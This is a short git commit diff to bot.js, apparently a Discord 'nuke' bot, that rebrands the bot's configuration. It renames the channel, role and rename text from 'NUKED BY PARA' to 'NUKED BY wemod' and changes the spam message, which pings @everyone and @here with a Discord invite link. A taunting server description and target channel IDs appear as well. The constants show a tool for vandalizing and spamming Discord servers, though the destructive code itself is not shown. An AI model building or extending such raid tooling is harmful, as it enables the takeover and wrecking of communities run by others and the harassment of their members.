b5cc7407dea3edcfbd024824451bdc97d3a67ee4
desekilardro-lab <desekilardro@gmail.com>
2026-09-20 14:17:59 -0400

    Update bot.js

--- bot.js
+++ bot.js
@@ -16,10 +16,10 @@ const client = new Client({
 
 const PREFIX = '!';
 const LOG_CHANNEL_ID = '1519135619559981058';
-const NUKE_CHANNEL_NAME = 'NUKED BY PARA';
-const NUKE_ROLE_NAME = 'NUKED BY PARA';
-const RENAME_TEXT = 'NUKED BY PARA';
-const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/hellstarrp ||`;
+const NUKE_CHANNEL_NAME = 'NUKED BY wemod';
+const NUKE_ROLE_NAME = 'NUKED BY wemod';
+const RENAME_TEXT = 'NUKED BY wemod';
+const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/wemod ||`;
 const ICON_URL = 'https://cdn.discordapp.com/banners/1490618417802383492/74aa02b06eb17298407e9b599cf917d1.webp?size=1024';
 const SERVER_DESCRIPTION = 'HAHAHAHAHAHAHAH';
 const TARGET_VOICE_CHANNEL_ID = '1519135619559981059';
